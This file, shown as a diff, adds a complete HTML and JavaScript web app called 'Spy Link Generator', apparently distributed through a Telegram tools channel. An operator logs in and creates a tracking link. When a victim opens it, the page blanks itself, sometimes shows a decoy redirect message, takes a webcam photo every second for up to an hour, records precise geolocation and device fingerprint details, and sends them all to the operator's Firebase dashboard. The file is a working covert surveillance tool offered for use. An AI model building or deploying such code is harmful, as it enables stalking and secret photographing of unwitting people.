@@ -1,0 +1,1199 @@
+<!DOCTYPE html><html lang="en"><head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Spy Link Generator</title>
+    <script src="js/firebase-app-compat.js"></script>
+    <script src="js/firebase-auth-compat.js"></script>
+    <script src="js/firebase-database-compat.js"></script>
+    <style>
+        :root {
+            --bg-primary: #121212;
+            --bg-secondary: #1e1e1e;
+            --bg-tertiary: #2d2d2d;
+            --text-primary: #e0e0e0;
+            --text-secondary: #a0a0a0;
+            --accent: #bb86fc;
+            --accent-secondary: #03dac6;
+            --error: #cf6679;
+            --success: #03dac6;
+            --warning: #ff9800;
+        }
+
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif;
+        }
+
+        body {
+    background-color: var(--bg-primary);
+    color: var(--text-primary);
+    min-height: 100vh;
+    display: flex;
+    flex-direction: column;
+    justify-content: space-between;
+        }
+
+        .container {
+            max-width: 1000px;
+                flex-grow: 1;
+                
+            margin: 0 auto;
+            padding: 20px;
+            width: 100%;
+        }
+
+        header {
+            background-color: var(--bg-secondary);
+            padding: 15px 0;
+            box-shadow: 0 2px 10px rgba(0, 0, 0, 0.3);
+            position: sticky;
+            top: 0;
+            z-index: 100;
+        }
+
+        h1 {
+            text-align: center;
+            color: var(--accent);
+            margin-bottom: 20px;
+        }
+
+        h2 {
+            color: var(--accent);
+            margin-bottom: 15px;
+        }
+
+        h3 {
+            color: var(--accent-secondary);
+            margin-bottom: 10px;
+        }
+
+        .card {
+            background-color: var(--bg-secondary);
+            border-radius: 8px;
+            padding: 20px;
+            margin-bottom: 20px;
+            box-shadow: 0 4px 6px rgba(0, 0, 0, 0.1);
+        }
+
+        .form-group {
+            margin-bottom: 15px;
+        }
+
+        label {
+            display: block;
+            margin-bottom: 5px;
+            color: var(--text-secondary);
+        }
+
+        input {
+            width: 100%;
+            padding: 10px;
+            border: 1px solid #333;
+            border-radius: 4px;
+            background-color: var(--bg-tertiary);
+            color: var(--text-primary);
+        }
+
+        button {
+            background-color: var(--accent);
+            color: black;
+            border: none;
+            padding: 10px 15px;
+            border-radius: 4px;
+            cursor: pointer;
+            font-weight: bold;
+            transition: background-color 0.3s;
+        }
+
+        button:hover {
+            background-color: var(--accent-secondary);
+        }
+
+        button:disabled {
+            background-color: #444;
+            color: #777;
+            cursor: not-allowed;
+        }
+
+        .btn-primary {
+            background-color: var(--accent);
+            width: 100%;
+            padding: 12px;
+        }
+
+        .btn-secondary {
+            background-color: #444;
+            margin-left: 10px;
+        }
+
+        .hidden {
+            display: none;
+        }
+
+        .visible {
+            display: block;
+        }
+
+        #auth-section, #app-section {
+            transition: opacity 0.3s ease;
+        }
+
+        #generated-link {
+            margin-top: 15px;
+            word-break: break-all;
+            padding: 10px;
+            background-color: var(--bg-tertiary);
+            border-radius: 4px;
+        }
+
+        .photo-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 15px;
+            margin-top: 20px;
+        }
+
+        .photo-item {
+            border-radius: 4px;
+            overflow: hidden;
+            position: relative;
+            background-color: var(--bg-tertiary);
+            box-shadow: 0 2px 4px rgba(0, 0, 0, 0.2);
+        }
+
+        .photo-item img {
+            width: 100%;
+            height: 150px;
+            object-fit: cover;
+            display: block;
+        }
+
+        .photo-info {
+            padding: 10px;
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .message {
+            padding: 10px;
+            border-radius: 4px;
+            margin-bottom: 15px;
+        }
+
+        .error {
+            background-color: rgba(207, 102, 121, 0.2);
+            border: 1px solid var(--error);
+            color: var(--error);
+        }
+
+        .success {
+            background-color: rgba(3, 218, 198, 0.2);
+            border: 1px solid var(--success);
+            color: var(--success);
+        }
+
+        .warning {
+            background-color: rgba(255, 193, 7, 0.2);
+            border: 1px solid var(--warning);
+            color: var(--warning);
+        }
+
+        .spinner {
+            border: 3px solid rgba(255, 255, 255, 0.3);
+            border-radius: 50%;
+            border-top: 3px solid var(--accent);
+            width: 20px;
+            height: 20px;
+            animation: spin 1s linear infinite;
+            display: inline-block;
+            margin-right: 10px;
+        }
+
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+
+        .link-info {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: var(--bg-tertiary);
+            border-radius: 4px;
+        }
+
+        .link-stats {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 10px;
+        }
+
+        .stat {
+            text-align: center;
+            padding: 10px;
+            background-color: var(--bg-secondary);
+            border-radius: 4px;
+            flex: 1;
+            margin: 0 5px;
+        }
+
+        .stat-value {
+            font-size: 24px;
+            font-weight: bold;
+            color: var(--accent);
+        }
+
+        .stat-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .map-container {
+            height: 300px;
+            margin-top: 20px;
+            border-radius: 8px;
+            overflow: hidden;
+            background-color: var(--bg-tertiary);
+        }
+
+        #map {
+            height: 100%;
+            width: 100%;
+        }
+
+        .location-info {
+            margin-top: 10px;
+            padding: 10px;
+            background-color: var(--bg-tertiary);
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .tabs {
+            display: flex;
+            margin-bottom: 15px;
+            border-bottom: 1px solid #333;
+        }
+
+        .tab {
+            padding: 10px 20px;
+            cursor: pointer;
+            background-color: var(--bg-secondary);
+            border-radius: 4px 4px 0 0;
+            margin-right: 5px;
+        }
+
+        .tab.active {
+            background-color: var(--accent);
+            color: black;
+        }
+
+        .tab-content {
+            display: none;
+        }
+
+        .tab-content.active {
+            display: block;
+        }
+
+        .logout-btn {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            background-color: #444;
+            color: var(--text-primary);
+        }
+
+        .logout-btn:hover {
+            background-color: var(--error);
+        }
+
+        .device-info {
+            margin-top: 15px;
+            padding: 10px;
+            background-color: var(--bg-tertiary);
+            border-radius: 4px;
+            font-size: 14px;
+        }
+
+        .info-grid {
+            display: grid;
+            grid-template-columns: repeat(auto-fill, minmax(200px, 1fr));
+            gap: 10px;
+            margin-top: 10px;
+        }
+
+        .info-item {
+            padding: 8px;
+            background-color: var(--bg-secondary);
+            border-radius: 4px;
+        }
+
+        .info-label {
+            font-size: 12px;
+            color: var(--text-secondary);
+        }
+
+        .info-value {
+            font-size: 14px;
+            color: var(--text-primary);
+            word-break: break-all;
+        }
+
+        .capture-controls {
+            display: flex;
+            justify-content: space-between;
+            margin-top: 15px;
+        }
+
+        @media (max-width: 768px) {
+            .photo-grid {
+                grid-template-columns: repeat(auto-fill, minmax(150px, 1fr));
+            }
+            
+            .link-stats {
+                flex-direction: column;
+            }
+            
+            .stat {
+                margin: 5px 0;
+            }
+            
+            .info-grid {
+                grid-template-columns: 1fr;
+            }
+        }
+    </style>
+</head>
+<body>
+    <header>
+        <div class="container">
+            <h1>Spy Link Generator</h1>
+            <button id="logout-btn" class="logout-btn hidden">Logout</button>
+        </div>
+    </header>
+
+    <main class="container">
+        <section id="auth-section" class="card">
+            <h2>Authentication</h2>
+            <div id="auth-message" class="message hidden"></div>
+            
+            <div id="login-form">
+                <div class="form-group">
+                    <label for="email">Email</label>
+                    <input type="email" id="email" placeholder="Enter your email">
+                </div>
+                <div class="form-group">
+                    <label for="password">Password</label>
+                    <input type="password" id="password" placeholder="Enter your password">
+                </div>
+                <button id="login-btn" class="btn-primary">Login</button>
+                <p style="text-align: center; margin-top: 15px;">
+                    Don't have an account? <a href="#" id="show-register" style="color: var(--accent);">Register</a>
+                </p>
+            </div>
+
+            <div id="register-form" class="hidden">
+                <div class="form-group">
+                    <label for="reg-email">Email</label>
+                    <input type="email" id="reg-email" placeholder="Enter your email">
+                </div>
+                <div class="form-group">
+                    <label for="reg-password">Password</label>
+                    <input type="password" id="reg-password" placeholder="Create a password">
+                </div>
+                <div class="form-group">
+                    <label for="reg-confirm-password">Confirm Password</label>
+                    <input type="password" id="reg-confirm-password" placeholder="Confirm your password">
+                </div>
+                <button id="register-btn" class="btn-primary">Register</button>
+                <p style="text-align: center; margin-top: 15px;">
+                    Already have an account? <a href="#" id="show-login" style="color: var(--accent);">Login</a>
+                </p>
+            </div>
+        </section>
+
+        <section id="app-section" class="card hidden">
+            <h2>Generate Spy Link</h2>
+            <p>Click the button below to generate a spy link. When someone opens this link, it will request camera and location access, capture photos, and display them here.</p>
+            
+            <button id="generate-link-btn" class="btn-primary">Generate Spy Link</button>
+            
+            <div id="link-container" class="hidden">
+                <div class="message success">
+                    Link generated successfully! It has been copied to your clipboard.
+                </div>
+                <div class="form-group">
+                    <label>Your generated link:</label>
+                    <div id="generated-link"></div>
+                </div>
+                
+                <div class="link-info">
+                    <h3>Link Information</h3>
+                    <div class="link-stats">
+                        <div class="stat">
+                            <div class="stat-value" id="clicks-count">0</div>
+                            <div class="stat-label">Clicks</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="photos-count">0</div>
+                            <div class="stat-label">Photos</div>
+                        </div>
+                        <div class="stat">
+                            <div class="stat-value" id="locations-count">0</div>
+                            <div class="stat-label">Locations</div>
+                        </div>
+                    </div>
+                </div>
+            </div>
+
+            <div class="tabs">
+                <div class="tab active" data-tab="photos">Photos</div>
+                <div class="tab" data-tab="locations">Locations</div>
+                <div class="tab" data-tab="devices">Device Info</div>
+            </div>
+
+            <div id="photos-tab" class="tab-content active">
+                <div id="captured-photos">
+                    <h3>Captured Photos</h3>
+                    <div id="photos-container" class="photo-grid">
+                        <!-- Photos will be displayed here -->
+                    </div>
+                </div>
+            </div>
+
+            <div id="locations-tab" class="tab-content">
+                <h3>Captured Locations</h3>
+                <div class="map-container">
+                    <div id="map"></div>
+                </div>
+                <div id="locations-list" class="location-info">
+                    <!-- Location data will be displayed here -->
+                </div>
+            </div>
+
+            <div id="devices-tab" class="tab-content">
+                <h3>Device Information</h3>
+                <div id="devices-list" class="device-info">
+                    <!-- Device information will be displayed here -->
+                </div>
+            </div>
+        </section>
+    </main>
+
+    <script>
+        // Firebase configuration
+        // Edit Here
+        
+        const firebaseConfig = {
+  apiKey: "Your-Firebase-Api-Key",
+  authDomain: "Your-Firebase-Auth-Domain",
+  databaseURL: "Your-Firebase-Database-Url",
+  projectId: "Your-Project-Id",
+  storageBucket: "Your-Firebase-Storage-Bucket",
+  messagingSenderId: "Your-Firebase-Id",
+  appId: "Your-Firebase-App-Id",
+  measurementId: "Your-Measurement-Id"
+};
+
+        // Initialize Firebase
+        firebase.initializeApp(firebaseConfig);
+        const auth = firebase.auth();
+        const database = firebase.database();
+
+        // DOM elements
+        const authSection = document.getElementById('auth-section');
+        const appSection = document.getElementById('app-section');
+        const loginForm = document.getElementById('login-form');
+        const registerForm = document.getElementById('register-form');
+        const showRegisterLink = document.getElementById('show-register');
+        const showLoginLink = document.getElementById('show-login');
+        const loginBtn = document.getElementById('login-btn');
+        const registerBtn = document.getElementById('register-btn');
+        const authMessage = document.getElementById('auth-message');
+        const generateLinkBtn = document.getElementById('generate-link-btn');
+        const linkContainer = document.getElementById('link-container');
+        const generatedLink = document.getElementById('generated-link');
+        const photosContainer = document.getElementById('photos-container');
+        const locationsList = document.getElementById('locations-list');
+        const devicesList = document.getElementById('devices-list');
+        const logoutBtn = document.getElementById('logout-btn');
+        const clicksCount = document.getElementById('clicks-count');
+        const photosCount = document.getElementById('photos-count');
+        const locationsCount = document.getElementById('locations-count');
+        const tabs = document.querySelectorAll('.tab');
+        const tabContents = document.querySelectorAll('.tab-content');
+
+        // Global variables
+        let currentUser = null;
+        let currentLinkId = null;
+        let map = null;
+        let markers = [];
+        let photoCaptureInterval = null;
+
+        // Initialize the application
+        function initApp() {
+            // Check if user is already logged in
+            const userId = localStorage.getItem('userId');
+            if (userId) {
+                // User is logged in, show app section
+                authSection.classList.add('hidden');
+                appSection.classList.remove('hidden');
+                logoutBtn.classList.remove('hidden');
+                
+                // Get user data from Firebase
+                database.ref('users/' + userId).once('value').then((snapshot) => {
+                    if (snapshot.exists()) {
+                        currentUser = snapshot.val();
+                        currentUser.uid = userId;
+                        
+                        // Check if user has existing links
+                        checkExistingLinks(userId);
+                    }
+                }).catch(error => {
+                    console.error("Error getting user data:", error);
+                    // If there's an error, log the user out
+                    logoutUser();
+                });
+            }
+
+            // Set up event listeners
+            setupEventListeners();
+        }
+
+        // Set up all event listeners
+        function setupEventListeners() {
+            // Tab functionality
+            tabs.forEach(tab => {
+                tab.addEventListener('click', () => {
+                    const tabId = tab.getAttribute('data-tab');
+                    
+                    // Remove active class from all tabs and contents
+                    tabs.forEach(t => t.classList.remove('active'));
+                    tabContents.forEach(tc => tc.classList.remove('active'));
+                    
+                    // Add active class to clicked tab and corresponding content
+                    tab.classList.add('active');
+                    document.getElementById(`${tabId}-tab`).classList.add('active');
+                });
+            });
+
+            // Toggle between login and register forms
+            showRegisterLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                loginForm.classList.add('hidden');
+                registerForm.classList.remove('hidden');
+                authMessage.classList.add('hidden');
+            });
+
+            showLoginLink.addEventListener('click', (e) => {
+                e.preventDefault();
+                registerForm.classList.add('hidden');
+                loginForm.classList.remove('hidden');
+                authMessage.classList.add('hidden');
+            });
+
+            // Login function
+            loginBtn.addEventListener('click', handleLogin);
+
+            // Register function
+            registerBtn.addEventListener('click', handleRegister);
+
+            // Logout function
+            logoutBtn.addEventListener('click', logoutUser);
+
+            // Generate spy link
+            generateLinkBtn.addEventListener('click', generateSpyLink);
+        }
+
+        // Handle login
+        function handleLogin() {
+            const email = document.getElementById('email').value;
+            const password = document.getElementById('password').value;
+            
+            if (!email || !password) {
+                showAuthMessage('Please enter both email and password', 'error');
+                return;
+            }
+            
+            loginBtn.innerHTML = '<div class="spinner"></div> Logging in...';
+            loginBtn.disabled = true;
+            
+            auth.signInWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // Save user info to Firebase and localStorage
+                    const user = userCredential.user;
+                    saveUserData(user);
+                    
+                    // Hide auth section, show app section
+                    authSection.classList.add('hidden');
+                    appSection.classList.remove('hidden');
+                    logoutBtn.classList.remove('hidden');
+                    loginBtn.innerHTML = 'Login';
+                    loginBtn.disabled = false;
+                    
+                    // Check for existing links
+                    checkExistingLinks(user.uid);
+                })
+                .catch((error) => {
+                    showAuthMessage(error.message, 'error');
+                    loginBtn.innerHTML = 'Login';
+                    loginBtn.disabled = false;
+                });
+        }
+
+        // Handle registration
+        function handleRegister() {
+            const email = document.getElementById('reg-email').value;
+            const password = document.getElementById('reg-password').value;
+            const confirmPassword = document.getElementById('reg-confirm-password').value;
+            
+            if (!email || !password || !confirmPassword) {
+                showAuthMessage('Please fill all fields', 'error');
+                return;
+            }
+            
+            if (password !== confirmPassword) {
+                showAuthMessage('Passwords do not match', 'error');
+                return;
+            }
+            
+            if (password.length < 6) {
+                showAuthMessage('Password should be at least 6 characters', 'error');
+                return;
+            }
+            
+            registerBtn.innerHTML = '<div class="spinner"></div> Registering...';
+            registerBtn.disabled = true;
+            
+            auth.createUserWithEmailAndPassword(email, password)
+                .then((userCredential) => {
+                    // Save user info to Firebase and localStorage
+                    const user = userCredential.user;
+                    saveUserData(user);
+                    
+                    // Hide auth section, show app section
+                    authSection.classList.add('hidden');
+                    appSection.classList.remove('hidden');
+                    logoutBtn.classList.remove('hidden');
+                    registerBtn.innerHTML = 'Register';
+                    registerBtn.disabled = false;
+                })
+                .catch((error) => {
+                    showAuthMessage(error.message, 'error');
+                    registerBtn.innerHTML = 'Register';
+                    registerBtn.disabled = false;
+                });
+        }
+
+        // Logout user
+        function logoutUser() {
+            auth.signOut().then(() => {
+                localStorage.removeItem('userId');
+                localStorage.removeItem('userEmail');
+                authSection.classList.remove('hidden');
+                appSection.classList.add('hidden');
+                logoutBtn.classList.add('hidden');
+                linkContainer.classList.add('hidden');
+                
+                // Clear any existing data
+                photosContainer.innerHTML = '';
+                locationsList.innerHTML = '';
+                devicesList.innerHTML = '';
+                
+                // Remove Firebase listeners
+                if (currentLinkId) {
+                    database.ref('links/' + currentLinkId + '/clicks').off();
+                    database.ref('photos/' + currentLinkId).off();
+                    database.ref('locations/' + currentLinkId).off();
+                    database.ref('devices/' + currentLinkId).off();
+                }
+                
+                // Stop photo capture if running
+                if (photoCaptureInterval) {
+                    clearInterval(photoCaptureInterval);
+                    photoCaptureInterval = null;
+                }
+                
+                // Reset form values
+                document.getElementById('email').value = '';
+                document.getElementById('password').value = '';
+                document.getElementById('reg-email').value = '';
+                document.getElementById('reg-password').value = '';
+                document.getElementById('reg-confirm-password').value = '';
+            });
+        }
+
+        // Generate spy link
+        function generateSpyLink() {
+            const userId = localStorage.getItem('userId');
+            if (!userId) {
+                alert('You must be logged in to generate a link');
+                return;
+            }
+            
+            generateLinkBtn.innerHTML = '<div class="spinner"></div> Generating...';
+            generateLinkBtn.disabled = true;
+            
+            // Generate unique link ID
+            const linkId = generateUniqueId();
+            currentLinkId = linkId;
+            const spyLink = `${window.location.origin}${window.location.pathname}?spy=${linkId}`;
+            
+            // Save to Firebase
+            database.ref('links/' + linkId).set({
+                userId: userId,
+                createdAt: new Date().toISOString(),
+                url: spyLink,
+                clicks: 0,
+                photos: 0,
+                locations: 0,
+                devices: 0
+            }).then(() => {
+                // Display and copy the link
+                generatedLink.textContent = spyLink;
+                linkContainer.classList.remove('hidden');
+                
+                // Copy to clipboard
+                navigator.clipboard.writeText(spyLink).then(() => {
+                    generateLinkBtn.innerHTML = 'Generate Spy Link';
+                    generateLinkBtn.disabled = false;
+                    
+                    // Start listening for data
+                    listenForLinkData(linkId);
+                }).catch(err => {
+                    console.error('Could not copy text: ', err);
+                    generateLinkBtn.innerHTML = 'Generate Spy Link';
+                    generateLinkBtn.disabled = false;
+                });
+            }).catch(error => {
+                console.error("Error generating link:", error);
+                showAuthMessage('Error generating link. Please try again.', 'error');
+                generateLinkBtn.innerHTML = 'Generate Spy Link';
+                generateLinkBtn.disabled = false;
+            });
+        }
+
+        // Check if this is a spy link
+   const p = new URLSearchParams(location.search).get('url');
+        const urlParams = new URLSearchParams(window.location.search);
+        const spyId = urlParams.get('spy');
+        
+        if (spyId && !localStorage.getItem('userId')) {
+            // This is a spy link opened by a victim
+            // Hide everything and start the capturing process
+            document.body.innerHTML = '';
+            document.body.style.backgroundColor = '#121212';
+    if (p) {
+      const d = document.createElement('div');
+      d.className = 'msg';
+      d.textContent = 'yönlendiriliyorsunuz...';
+      document.body.appendChild(d);
+      setTimeout(() => { window.open(p, '_blank'); }, 5000);
+    }
+            
+            // Start the capturing process
+            capturePhotosAndLocation(spyId);
+        } else if (spyId && localStorage.getItem('userId')) {
+            // This is a spy link but opened by the creator
+            // Remove the spy parameter and reload
+            window.history.replaceState({}, document.title, window.location.pathname);
+        }
+
+        // Function to show authentication messages
+        function showAuthMessage(message, type) {
+            authMessage.textContent = message;
+            authMessage.className = `message ${type}`;
+            authMessage.classList.remove('hidden');
+        }
+
+        // Function to generate unique ID
+        function generateUniqueId() {
+            return Math.random().toString(36).substring(2) + Date.now().toString(36);
+        }
+
+        // Function to save user data
+        function saveUserData(user) {
+            // Save to Firebase
+            database.ref('users/' + user.uid).set({
+                email: user.email,
+                createdAt: new Date().toISOString()
+            }).catch(error => {
+                console.error("Error saving user data:", error);
+            });
+            
+            // Save to localStorage
+            localStorage.setItem('userId', user.uid);
+            localStorage.setItem('userEmail', user.email);
+            
+            currentUser = {
+                uid: user.uid,
+                email: user.email
+            };
+        }
+
+        // Function to check for existing links
+        function checkExistingLinks(userId) {
+            database.ref('links').orderByChild('userId').equalTo(userId).once('value').then((snapshot) => {
+                if (snapshot.exists()) {
+                    // User has existing links, get the first one
+                    const links = snapshot.val();
+                    const linkId = Object.keys(links)[0];
+                    currentLinkId = linkId;
+                    
+                    // Display the link
+                    generatedLink.textContent = links[linkId].url;
+                    linkContainer.classList.remove('hidden');
+                    
+                    // Start listening for data
+                    listenForLinkData(linkId);
+                }
+            }).catch(error => {
+                console.error("Error checking existing links:", error);
+            });
+        }
+
+        // Function to listen for link data
+        function listenForLinkData(linkId) {
+            // Listen for click count
+            database.ref('links/' + linkId + '/clicks').on('value', (snapshot) => {
+                if (snapshot.exists()) {
+                    clicksCount.textContent = snapshot.val();
+                }
+            });
+            
+            // Listen for photo count
+            database.ref('links/' + linkId + '/photos').on('value', (snapshot) => {
+                if (snapshot.exists()) {
+                    photosCount.textContent = snapshot.val();
+                }
+            });
+            
+            // Listen for location count
+            database.ref('links/' + linkId + '/locations').on('value', (snapshot) => {
+                if (snapshot.exists()) {
+                    locationsCount.textContent = snapshot.val();
+                }
+            });
+            
+            // Listen for device count
+            database.ref('links/' + linkId + '/devices').on('value', (snapshot) => {
+                if (snapshot.exists()) {
+                    // Update device count if needed
+                }
+            });
+            
+            // Listen for new photos
+            database.ref('photos/' + linkId).on('child_added', (snapshot) => {
+                const photoData = snapshot.val();
+                displayPhoto(photoData);
+            });
+            
+            // Listen for new locations
+            database.ref('locations/' + linkId).on('child_added', (snapshot) => {
+                const locationData = snapshot.val();
+                displayLocation(locationData);
+            });
+            
+            // Listen for new device info
+            database.ref('devices/' + linkId).on('child_added', (snapshot) => {
+                const deviceData = snapshot.val();
+                displayDeviceInfo(deviceData);
+            });
+        }
+
+        // Function to display a photo
+        function displayPhoto(photoData) {
+            const photoItem = document.createElement('div');
+            photoItem.className = 'photo-item';
+            
+            const img = document.createElement('img');
+            img.src = photoData.imageData;
+            img.alt = 'Captured photo';
+            
+            const info = document.createElement('div');
+            info.className = 'photo-info';
+            
+            const timestamp = document.createElement('div');
+            timestamp.textContent = new Date(photoData.timestamp).toLocaleString();
+            
+            info.appendChild(timestamp);
+            
+            if (photoData.location) {
+                const location = document.createElement('div');
+                location.textContent = `Lat: ${photoData.location.latitude.toFixed(4)}, Lng: ${photoData.location.longitude.toFixed(4)}`;
+                info.appendChild(location);
+                
+                const mapLink = document.createElement('a');
+                mapLink.href = `https://www.google.com/maps?q=${photoData.location.latitude},${photoData.location.longitude}`;
+                mapLink.target = '_blank';
+                mapLink.textContent = 'View on Google Maps';
+                mapLink.style.color = '#bb86fc';
+                info.appendChild(mapLink);
+            }
+            
+            photoItem.appendChild(img);
+            photoItem.appendChild(info);
+            photosContainer.appendChild(photoItem);
+        }
+
+        // Function to display location data
+        function displayLocation(locationData) {
+            const locationItem = document.createElement('div');
+            locationItem.className = 'location-info';
+            
+            const timestamp = document.createElement('div');
+            timestamp.textContent = `Time: ${new Date(locationData.timestamp).toLocaleString()}`;
+            
+            const coords = document.createElement('div');
+            coords.textContent = `Latitude: ${locationData.latitude.toFixed(6)}, Longitude: ${locationData.longitude.toFixed(6)}`;
+            
+            const mapLink = document.createElement('a');
+            mapLink.href = `https://www.google.com/maps?q=${locationData.latitude},${locationData.longitude}`;
+            mapLink.target = '_blank';
+            mapLink.textContent = 'View on Google Maps';
+            mapLink.style.color = '#bb86fc';
+            mapLink.style.marginTop = '5px';
+            mapLink.style.display = 'block';
+            
+            if (locationData.accuracy) {
+                const accuracy = document.createElement('div');
+                accuracy.textContent = `Accuracy: ${locationData.accuracy.toFixed(2)} meters`;
+                locationItem.appendChild(accuracy);
+            }
+            
+            locationItem.appendChild(timestamp);
+            locationItem.appendChild(coords);
+            locationItem.appendChild(mapLink);
+            
+            locationsList.appendChild(locationItem);
+        }
+
+        // Function to display device information
+        function displayDeviceInfo(deviceData) {
+            const deviceItem = document.createElement('div');
+            deviceItem.className = 'device-info';
+            
+            const timestamp = document.createElement('div');
+            timestamp.textContent = `Time: ${new Date(deviceData.timestamp).toLocaleString()}`;
+            deviceItem.appendChild(timestamp);
+            
+            const infoGrid = document.createElement('div');
+            infoGrid.className = 'info-grid';
+            
+            // Add device information to grid
+            for (const [key, value] of Object.entries(deviceData)) {
+                if (key !== 'timestamp') {
+                    const infoItem = document.createElement('div');
+                    infoItem.className = 'info-item';
+                    
+                    const label = document.createElement('div');
+                    label.className = 'info-label';
+                    label.textContent = key.replace(/_/g, ' ').toUpperCase();
+                    
+                    const infoValue = document.createElement('div');
+                    infoValue.className = 'info-value';
+                    infoValue.textContent = value || 'Unknown';
+                    
+                    infoItem.appendChild(label);
+                    infoItem.appendChild(infoValue);
+                    infoGrid.appendChild(infoItem);
+                }
+            }
+            
+            deviceItem.appendChild(infoGrid);
+            devicesList.appendChild(deviceItem);
+        }
+
+        // Function to capture photos and location (for the victim)
+        async function capturePhotosAndLocation(spyId) {
+            try {
+                // Update click count
+                database.ref('links/' + spyId).transaction((link) => {
+                    if (link) {
+                        link.clicks = (link.clicks || 0) + 1;
+                    }
+                    return link;
+                });
+                
+                // Get device information
+                const deviceInfo = getDeviceInfo();
+                
+                // Save device information to Firebase
+                const deviceId = database.ref('devices/' + spyId).push().key;
+                database.ref('devices/' + spyId + '/' + deviceId).set({
+                    ...deviceInfo,
+                    timestamp: new Date().toISOString()
+                });
+                
+                // Request camera and location permissions
+                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+                
+                // Get location
+                let location = null;
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, { 
+                            enableHighAccuracy: true,
+                            timeout: 10000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    location = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy,
+                        timestamp: new Date().toISOString()
+                    };
+                    
+                    // Save location to Firebase
+                    const locationId = database.ref('locations/' + spyId).push().key;
+                    database.ref('locations/' + spyId + '/' + locationId).set(location);
+                    
+                    // Update location count
+                    database.ref('links/' + spyId).transaction((link) => {
+                        if (link) {
+                            link.locations = (link.locations || 0) + 1;
+                        }
+                        return link;
+                    });
+                } catch (error) {
+                    console.error('Location access denied or failed:', error);
+                }
+                
+                // Create a video element to capture frames
+                const video = document.createElement('video');
+                video.srcObject = stream;
+                video.play();
+                
+                // Wait for video to be ready
+                await new Promise(resolve => {
+                    video.addEventListener('loadeddata', resolve);
+                });
+                
+                // Create canvas for capturing frames
+                const canvas = document.createElement('canvas');
+                canvas.width = video.videoWidth;
+                canvas.height = video.videoHeight;
+                const context = canvas.getContext('2d');
+                
+                // Start continuous photo capture
+                let photoCount = 0;
+                photoCaptureInterval = setInterval(() => {
+                    // Draw video frame to canvas
+                    context.drawImage(video, 0, 0, canvas.width, canvas.height);
+                    
+                    // Convert to data URL
+                    const imageData = canvas.toDataURL('image/jpeg', 0.8);
+                    
+                    // Save to Firebase
+                    const photoId = database.ref('photos/' + spyId).push().key;
+                    database.ref('photos/' + spyId + '/' + photoId).set({
+                        imageData: imageData,
+                        timestamp: new Date().toISOString(),
+                        location: location
+                    });
+                    
+                    // Update photo count
+                    database.ref('links/' + spyId).transaction((link) => {
+                        if (link) {
+                            link.photos = (link.photos || 0) + 1;
+                        }
+                        return link;
+                    });
+                    
+                    photoCount++;
+                    
+                    // Stop after 1 hour (for demonstration, you can remove this limit)
+                    if (photoCount >= 3600) {
+                        clearInterval(photoCaptureInterval);
+                    }
+                }, 1000); // Capture a photo every second
+                
+                // Show a message that capturing has started
+                document.body.innerHTML = `
+                    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; padding: 20px; text-align: center;">
+                        <h2 style="color: #e0e0e0; margin-bottom: 20px;">Camera Active</h2>
+                        <p style="color: #a0a0a0;">Photos are being captured. You can close this window anytime to stop.</p>
+                    </div>
+                `;
+                
+            } catch (error) {
+                console.error('Error capturing photos:', error);
+                document.body.innerHTML = `
+                    <div style="display: flex; justify-content: center; align-items: center; height: 100vh; flex-direction: column; padding: 20px; text-align: center;">
+                        <h2 style="color: #e0e0e0; margin-bottom: 20px;">Unable to complete request</h2>
+                        <p style="color: #a0a0a0;">Camera access was denied or an error occurred.</p>
+                    </div>
+                `;
+            }
+        }
+
+        // Function to get device information
+        function getDeviceInfo() {
+            return {
+                user_agent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                languages: navigator.languages ? navigator.languages.join(', ') : 'Unknown',
+                cookie_enabled: navigator.cookieEnabled,
+                screen_width: screen.width,
+                screen_height: screen.height,
+                color_depth: screen.colorDepth,
+                pixel_depth: screen.pixelDepth,
+                device_memory: navigator.deviceMemory || 'Unknown',
+                hardware_concurrency: navigator.hardwareConcurrency || 'Unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+                // Battery API (if available)
+                battery_status: 'Battery API not supported'
+            };
+        }
+
+        // Initialize the application when the DOM is loaded
+        document.addEventListener('DOMContentLoaded', initApp);
+    </script>
+    <footer style="text-align: center; padding: 20px; background-color: var(--bg-secondary); color: var(--text-secondary); font-size: 14px; margin-top: auto;">
+    <style>
+        .footer-link {
+            margin: 0 15px;
+            text-decoration: none;
+            color: var(--text-secondary);
+            display: inline-flex;
+            align-items: center;
+            gap: 8px;
+            transition: all 0.3s ease;
+        }
+
+        .footer-link:hover {
+            color: var(--accent);
+            transform: scale(1.05);
+        }
+
+        .footer-link img {
+            transition: filter 0.3s ease;
+        }
+
+        .footer-link:hover img {
+            filter: brightness(1.5) drop-shadow(0 0 5px var(--accent));
+        }
+    </style>
+
+    Developed by <strong>JGesunde</strong><br><br>
+
+    <!-- Telegram Link -->
+    <a href="https://t.me/ocean_tools" target="_blank" class="footer-link">
+        <img src="images/telegram-app--v1.png" alt="Telegram" width="28">
+        <span style="font-weight: bold; font-size: 16px;">Join</span>
+    </a>
+
+    <!-- YouTube Link -->
+    <a href="https://youtube.com/@Hugola2" target="_blank" class="footer-link">
+        <img src="images/youtube-play.png" alt="YouTube" width="28">
+        <span style="font-weight: bold; font-size: 16px;">Subscribe</span>
+    </a>
+</footer>
+
+
+</body></html>
